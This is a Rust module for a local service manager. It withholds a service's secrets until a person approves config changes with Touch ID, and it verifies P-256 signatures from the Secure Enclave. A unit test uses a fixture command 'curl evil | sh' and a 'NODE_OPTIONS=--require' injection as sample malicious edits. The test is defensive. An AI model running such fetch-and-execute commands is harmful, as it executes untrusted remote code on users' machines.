//! Touch ID approvals: what a service holding secrets runs, and which values it gets, change only
//! after a person approves the change on this Mac.
//!
//! LStack.app makes a P-256 key in the Secure Enclave that signs only after Touch ID (or your login
//! password), and registers its public key here. For each service with secrets the store keeps the
//! approved *spec*: its config minus cosmetic fields, plus each granted secret's name, reference,
//! source and a keyed digest of its value. Starting the service with a different spec withholds its
//! secrets and asks the app for approval, so an edited YAML file, an API call with the token or a
//! swapped value can't silently reach a process that holds your secrets. Restarts of an approved
//! spec need nobody. A console (stdin or `exec`) into such a service also needs an approval.
//!
//! The approval state lives inside the encrypted store (authenticated), so it can't be edited on disk.
//! Registration is trust-on-first-use; replacing the key needs a signature from the current one.
use super::secrets::{self, Meta, APPROVALS_NAME};
use super::supervisor::Sup;
use crate::paths::now_ms;
use crate::types::ServiceConfig;
use hmac::{Hmac, Mac};
use p256::ecdsa::signature::Verifier;
use p256::ecdsa::{Signature, VerifyingKey};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, HashMap};
use std::sync::{Arc, Mutex, OnceLock, Weak};

/// Fields that can't change what the service runs or what it's given.
const COSMETIC: &[&str] = &["description", "autostart", "restart", "maxRestarts", "tags", "urls", "detectUrls", "healthcheck"];
const PENDING_TTL_MS: i64 = 15 * 60_000;
const CONSOLE_MS: i64 = 10 * 60_000;
const MAX_PENDING: usize = 20;

#[derive(Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
struct State {
    /// SEC1 public key (hex) of LStack.app's Secure Enclave key.
    key: Option<String>,
    registered_at: i64,
    /// Keys the value digests, so a digest can't be used to guess a short value.
    salt: String,
    services: BTreeMap<String, Approved>,
}

#[derive(Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Approved {
    fp: String,
    spec: Value,
    at: i64,
}

#[derive(Clone)]
struct Pending {
    id: String,
    kind: &'static str,
    service: String,
    message: String,
    summary: Vec<String>,
    created: i64,
    fp: Option<String>,
    spec: Option<Value>,
    status: &'static str,
}

impl Pending {
    fn json(&self) -> Value {
        json!({
            "id": self.id, "kind": self.kind, "service": self.service, "summary": self.summary,
            "message": self.message, "created": self.created, "status": self.status,
            "expires": self.created + PENDING_TTL_MS,
        })
    }
}

#[derive(Default)]
struct Mem {
    pending: Vec<Pending>,
    consoles: HashMap<String, i64>,
}

static MEM: Mutex<Option<Mem>> = Mutex::new(None);
static SUP: OnceLock<Weak<Sup>> = OnceLock::new();

pub fn init(sup: &Arc<Sup>) {
    let _ = SUP.set(Arc::downgrade(sup));
}

fn mem<T>(f: impl FnOnce(&mut Mem) -> T) -> T {
    let mut g = MEM.lock().unwrap_or_else(|e| e.into_inner());
    let m = g.get_or_insert_with(Mem::default);
    let now = now_ms();
    for p in m.pending.iter_mut().filter(|p| p.status == "pending" && now - p.created > PENDING_TTL_MS) {
        p.status = "expired";
    }
    m.pending.retain(|p| now - p.created < 2 * PENDING_TTL_MS);
    f(m)
}

fn load() -> State {
    secrets::internal_get(APPROVALS_NAME).and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default()
}

fn save(s: &State) -> Result<(), String> {
    let v = serde_json::to_string(s).map_err(|e| e.to_string())?;
    secrets::set_many(vec![(APPROVALS_NAME.to_string(), v, Meta::default())])
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|b| format!("{b:02x}")).collect()
}

fn unhex(s: &str) -> Option<Vec<u8>> {
    (s.len() % 2 == 0).then(|| (0..s.len()).step_by(2).map(|i| u8::from_str_radix(s.get(i..i + 2)?, 16).ok()).collect()).flatten()
}

fn random_hex(n: usize) -> String {
    let mut b = vec![0u8; n];
    if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
        let _ = std::io::Read::read_exact(&mut f, &mut b);
    }
    hex(&b)
}

/// Approvals are on once LStack.app has registered its key (and the store is unlocked).
pub fn enabled() -> bool {
    !secrets::is_locked() && load().key.is_some()
}

/// What an approval covers for this service. `None`: it has no secrets, nothing to approve.
fn spec(cfg: &ServiceConfig, salt: &str) -> Option<Value> {
    let refs = cfg.secret_refs();
    if refs.is_empty() {
        return None;
    }
    let mut v = serde_json::to_value(cfg).ok()?;
    if let Some(o) = v.as_object_mut() {
        for k in COSMETIC {
            o.remove(*k);
        }
    }
    let metas = secrets::all_meta();
    let grants: Vec<Value> = refs
        .iter()
        .map(|(env, name)| {
            let m = metas.get(name).cloned().unwrap_or_default();
            // A value from a paired Mac may be updated by that same Mac (its pinned key) without asking again.
            let value = if m.from_peer() { m.peer_key.clone().map(|k| format!("peer:{k}")) } else { secrets::keyed_digest(name, salt.as_bytes()) };
            json!({ "env": env, "secret": name, "source": m.source.as_deref().unwrap_or("local"), "ref": m.reference, "value": value })
        })
        .collect();
    v["grants"] = Value::Array(grants);
    Some(v)
}

fn fingerprint(spec: &Value) -> String {
    hex(&Sha256::digest(spec.to_string().as_bytes()))
}

fn short(v: &Value) -> String {
    let s = match v {
        Value::Null => "(none)".to_string(),
        Value::String(s) => s.clone(),
        v => v.to_string(),
    };
    if s.chars().count() > 160 {
        format!("{}…", s.chars().take(160).collect::<String>())
    } else {
        s
    }
}

/// Human-readable differences between the approved spec and the new one.
fn describe(old: Option<&Value>, new: &Value) -> Vec<String> {
    let grant_line = |g: &Value| {
        let from = match g["source"].as_str() {
            Some("op" | "op-env") => format!(" from 1Password {}", g["ref"].as_str().unwrap_or("")),
            Some(s) if s.starts_with("peer:") => format!(" from paired Mac {}", &s[5..]),
            _ => " (typed in)".to_string(),
        };
        format!("{} ← secret {}{from}", g["env"].as_str().unwrap_or("?"), g["secret"].as_str().unwrap_or("?"))
    };
    let Some(old) = old else {
        let mut out = vec![format!("runs: {}", short(new.get("command").or(new.get("image")).unwrap_or(&Value::Null)))];
        if let Some(c) = new.get("cwd") {
            out.push(format!("in: {}", short(c)));
        }
        out.extend(new["grants"].as_array().into_iter().flatten().map(|g| format!("gets {}", grant_line(g))));
        return out;
    };
    let mut out = vec![];
    let empty = serde_json::Map::new();
    let (o, n) = (old.as_object().unwrap_or(&empty), new.as_object().unwrap_or(&empty));
    let mut keys: Vec<&String> = o.keys().chain(n.keys()).collect();
    keys.sort();
    keys.dedup();
    for k in keys {
        let (a, b) = (o.get(k).unwrap_or(&Value::Null), n.get(k).unwrap_or(&Value::Null));
        if a == b || k == "secrets" {
            continue;
        }
        match k.as_str() {
            "grants" => {
                let by_env = |v: &Value| -> BTreeMap<String, Value> {
                    v.as_array().into_iter().flatten().map(|g| (g["env"].as_str().unwrap_or("").to_string(), g.clone())).collect()
                };
                let (ga, gb) = (by_env(a), by_env(b));
                for (env, g) in &gb {
                    match ga.get(env) {
                        None => out.push(format!("now gets {}", grant_line(g))),
                        Some(x) if x["secret"] != g["secret"] || x["ref"] != g["ref"] || x["source"] != g["source"] => {
                            out.push(format!("{env} changes to {}", grant_line(g)))
                        }
                        Some(x) if x != g => out.push(format!("{env}: the value of secret {} changed", g["secret"].as_str().unwrap_or("?"))),
                        _ => {}
                    }
                }
                for env in ga.keys().filter(|e| !gb.contains_key(*e)) {
                    out.push(format!("no longer gets {env}"));
                }
            }
            "env" => {
                let (ea, eb) = (a.as_object().unwrap_or(&empty), b.as_object().unwrap_or(&empty));
                for (key, val) in eb {
                    if ea.get(key) != Some(val) {
                        out.push(format!("env {key}={}", short(val)));
                    }
                }
                for key in ea.keys().filter(|x| !eb.contains_key(*x)) {
                    out.push(format!("env {key} removed"));
                }
            }
            _ => out.push(format!("{k}: {} → {}", short(a), short(b))),
        }
    }
    if out.is_empty() {
        out.push("configuration changed".into());
    }
    out
}

fn notify(p: &Pending) {
    if let Some(sup) = SUP.get().and_then(Weak::upgrade) {
        let title = match p.kind {
            "console" => format!("Approve console access to {}", p.service),
            _ => format!("Approve changes to {}", p.service),
        };
        println!("{} approval requested: {title}", crate::paths::iso(now_ms()));
        let _ = sup.events.send(super::supervisor::Event::Notice(Arc::new(json!({
            "title": title, "body": p.summary.join("\n"), "approval": p.json(),
        }))));
    }
}

fn add_pending(kind: &'static str, service: &str, subject: String, summary: Vec<String>, fp: Option<String>, spec: Option<Value>) -> Pending {
    let id = random_hex(8);
    let challenge = random_hex(16);
    let message = format!("lstack-approval-v1\n{id}\n{challenge}\n{subject}");
    let p = Pending { id, kind, service: service.to_string(), message, summary, created: now_ms(), fp, spec, status: "pending" };
    mem(|m| {
        for old in m.pending.iter_mut().filter(|x| x.status == "pending" && x.kind == kind && x.service == service) {
            old.status = "replaced";
        }
        if m.pending.iter().filter(|x| x.status == "pending").count() >= MAX_PENDING {
            if let Some(o) = m.pending.iter_mut().find(|x| x.status == "pending") {
                o.status = "expired";
            }
        }
        m.pending.push(p.clone());
    });
    notify(&p);
    p
}

fn blocked(p: &Pending, what: &str) -> String {
    format!("{what} needs your approval in LStack.app (Touch ID): {} [approval:{}]", p.summary.join("; "), p.id)
}

/// The id in an error from `gate`/`console`, for clients that wait on it.
pub fn id_in(msg: &str) -> Option<&str> {
    msg.split("[approval:").nth(1)?.split(']').next()
}

/// Before a start gets secrets: is this exact spec approved? If not, ask (once per spec) and refuse.
pub fn gate(cfg: &ServiceConfig) -> Result<(), String> {
    if !enabled() {
        return Ok(());
    }
    let st = load();
    let Some(spec) = spec(cfg, &st.salt) else { return Ok(()) };
    let fp = fingerprint(&spec);
    let approved = st.services.get(&cfg.name);
    if approved.is_some_and(|a| a.fp == fp) {
        return Ok(());
    }
    let existing = mem(|m| m.pending.iter().find(|p| p.status == "pending" && p.service == cfg.name && p.fp.as_deref() == Some(&fp)).cloned());
    let p = match existing {
        Some(p) => p,
        None => {
            let summary = describe(approved.map(|a| &a.spec), &spec);
            add_pending("service", &cfg.name, format!("service:{}:{fp}", cfg.name), summary, Some(fp), Some(spec))
        }
    };
    Err(blocked(&p, &format!("{}'s secrets are held back: this configuration", cfg.name)))
}

/// Ask right away when a config with secrets changed (the app prompts while you're there), without failing.
pub fn prompt_if_needed(cfg: &ServiceConfig) {
    let _ = gate(cfg);
}

/// stdin or `exec` into a service holding secrets: allowed for a while after an approval.
pub fn console(cfg: &ServiceConfig) -> Result<(), String> {
    if cfg.secret_refs().is_empty() || !enabled() {
        return Ok(());
    }
    let now = now_ms();
    if mem(|m| m.consoles.get(&cfg.name).is_some_and(|until| *until > now)) {
        return Ok(());
    }
    let existing = mem(|m| m.pending.iter().find(|p| p.status == "pending" && p.kind == "console" && p.service == cfg.name).cloned());
    let p = existing.unwrap_or_else(|| {
        add_pending(
            "console",
            &cfg.name,
            format!("console:{}", cfg.name),
            vec![format!("type into or run commands inside {}, which holds secrets (10 minutes)", cfg.name)],
            None,
            None,
        )
    });
    Err(blocked(&p, &format!("a console into {}", cfg.name)))
}

pub fn pending_for(service: &str) -> Option<Value> {
    mem(|m| m.pending.iter().rev().find(|p| p.status == "pending" && p.kind == "service" && p.service == service).map(Pending::json))
}

pub fn list() -> Value {
    let st = if secrets::is_locked() { State::default() } else { load() };
    let pending: Vec<Value> = mem(|m| m.pending.iter().filter(|p| p.status == "pending").map(Pending::json).collect());
    json!({
        "enabled": st.key.is_some() && !secrets::is_locked(),
        "publicKey": st.key,
        "registeredAt": (st.registered_at > 0).then_some(st.registered_at),
        "approved": st.services.keys().collect::<Vec<_>>(),
        "pending": pending,
    })
}

pub fn get(id: &str) -> Option<Value> {
    mem(|m| m.pending.iter().find(|p| p.id == id).map(Pending::json))
}

fn verify(key_hex: &str, message: &[u8], sig: &str) -> Result<(), String> {
    let key = unhex(key_hex).and_then(|k| VerifyingKey::from_sec1_bytes(&k).ok()).ok_or("the registered approval key is invalid")?;
    let raw = unhex(sig.trim()).ok_or("signature must be hex")?;
    let sig = Signature::from_der(&raw).or_else(|_| Signature::from_slice(&raw)).map_err(|_| "malformed signature")?;
    key.verify(message, &sig).map_err(|_| "signature doesn't match the approval key".to_string())
}

/// A signed approval from LStack.app. Returns the service to start, if any.
pub fn approve(id: &str, signature: &str) -> Result<Option<String>, (u16, String)> {
    let mut st = load();
    let key = st.key.clone().ok_or((400, "approvals aren't set up (open LStack.app)".to_string()))?;
    let p = mem(|m| m.pending.iter().find(|p| p.id == id).cloned()).ok_or((404, "no such approval".to_string()))?;
    if p.status != "pending" {
        return Err((409, format!("this approval is {}", p.status)));
    }
    verify(&key, p.message.as_bytes(), signature).map_err(|e| (403, e))?;
    mem(|m| {
        if let Some(x) = m.pending.iter_mut().find(|x| x.id == id) {
            x.status = "approved";
        }
        if p.kind == "console" {
            m.consoles.insert(p.service.clone(), now_ms() + CONSOLE_MS);
        }
    });
    audit("approved", &p);
    if p.kind != "service" {
        return Ok(None);
    }
    let (Some(fp), Some(spec)) = (p.fp.clone(), p.spec.clone()) else { return Ok(None) };
    st.services.insert(p.service.clone(), Approved { fp, spec, at: now_ms() });
    save(&st).map_err(|e| (500, e))?;
    Ok(Some(p.service))
}

pub fn deny(id: &str) -> Result<(), (u16, String)> {
    let p = mem(|m| {
        let p = m.pending.iter_mut().find(|p| p.id == id && p.status == "pending")?;
        p.status = "denied";
        Some(p.clone())
    })
    .ok_or((404, "no such pending approval".to_string()))?;
    audit("denied", &p);
    Ok(())
}

fn audit(what: &str, p: &Pending) {
    super::envimport::audit("local", &format!("approval-{what}"), json!({ "kind": p.kind, "service": p.service, "changes": p.summary }));
}

/// Register LStack.app's public key. The first registration is trusted, and approves every current
/// service as it is (that's what you're running now). Replacing it needs the current key's signature
/// over `lstack-approval-rekey\n<new key>`.
pub fn register(public_key: &str, signature: Option<&str>, configs: &[ServiceConfig]) -> Result<Value, (u16, String)> {
    let pk = public_key.trim().to_ascii_lowercase();
    unhex(&pk).and_then(|k| VerifyingKey::from_sec1_bytes(&k).ok()).ok_or((400, "publicKey must be a hex SEC1 P-256 key".to_string()))?;
    if secrets::is_locked() {
        return Err((409, "the secret store is locked".into()));
    }
    let mut st = load();
    match (&st.key, signature) {
        (Some(k), _) if *k == pk => return Ok(list()),
        (Some(k), Some(sig)) => verify(k, format!("lstack-approval-rekey\n{pk}").as_bytes(), sig).map_err(|e| (403, e))?,
        (Some(_), None) => return Err((409, "a different approval key is registered; replacing it needs approval with that key".into())),
        (None, _) => {}
    }
    let first = st.key.is_none();
    st.key = Some(pk);
    st.registered_at = now_ms();
    if st.salt.is_empty() {
        st.salt = random_hex(32);
    }
    if first {
        for c in configs {
            if let Some(spec) = spec(c, &st.salt) {
                st.services.insert(c.name.clone(), Approved { fp: fingerprint(&spec), spec, at: now_ms() });
            }
        }
    }
    save(&st).map_err(|e| (500, e))?;
    super::envimport::audit("local", "approval-key-registered", json!({ "replaced": !first }));
    Ok(list())
}

type HmacSha256 = Hmac<Sha256>;

/// HMAC-SHA256(key, name ‖ 0 ‖ value), hex.
pub fn keyed(key: &[u8], name: &str, value: &[u8]) -> String {
    let mut m = <HmacSha256 as Mac>::new_from_slice(key).expect("hmac key");
    m.update(name.as_bytes());
    m.update(&[0]);
    m.update(value);
    hex(&m.finalize().into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn describes_changes() {
        let old = json!({ "command": "npm start", "env": { "A": "1" }, "grants": [
            { "env": "DB", "secret": "DB", "source": "op", "ref": "op://Dev/db/pw", "value": "x" }] });
        let new = json!({ "command": "curl evil | sh", "env": { "A": "1", "NODE_OPTIONS": "--require x" }, "grants": [
            { "env": "DB", "secret": "DB", "source": "op", "ref": "op://Dev/db/pw", "value": "y" },
            { "env": "BANK", "secret": "BANK", "source": "op", "ref": "op://Private/bank/pw", "value": "z" }] });
        let d = describe(Some(&old), &new).join("\n");
        assert!(d.contains("command: npm start → curl evil | sh"), "{d}");
        assert!(d.contains("env NODE_OPTIONS=--require x"), "{d}");
        assert!(d.contains("now gets BANK ← secret BANK from 1Password op://Private/bank/pw"), "{d}");
        assert!(d.contains("DB: the value of secret DB changed"), "{d}");
        assert_eq!(id_in("x needs approval [approval:ab12] y"), Some("ab12"));
    }

    #[test]
    fn verifies_p256_signatures() {
        use p256::ecdsa::signature::Signer;
        use p256::ecdsa::SigningKey;
        let sk = SigningKey::from_slice(&[7u8; 32]).unwrap();
        let pk = hex(&sk.verifying_key().to_sec1_point(false).as_bytes());
        let sig: Signature = sk.sign(b"lstack-approval-v1\nid\nc\nconsole:api");
        let der = hex(sig.to_der().as_bytes());
        assert!(verify(&pk, b"lstack-approval-v1\nid\nc\nconsole:api", &der).is_ok());
        assert!(verify(&pk, b"lstack-approval-v1\nid\nc\nconsole:web", &der).is_err());
    }
}
